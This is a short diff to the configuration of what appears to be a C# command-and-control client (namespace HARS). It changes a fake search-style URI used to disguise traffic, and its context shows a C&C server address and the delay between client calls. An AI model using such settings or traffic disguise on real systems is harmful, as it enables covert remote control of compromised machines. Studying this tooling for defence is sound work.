@@ -24,7 +24,7 @@ namespace HARS
             // Max delay between the client calls
             public static int MaxDelay = 5;
             // Fake uri requested - Warning : it must begin with "search" (or need a change on server side)
-            public static string Url = "search?q=search+something&qs=n&form=QBRE&cvid=";
+            public static string Url = "search?q=search";
             /* Listener */
             // Hostname/IP of C&C server
             public static string Server = "https://192.168.1.249";
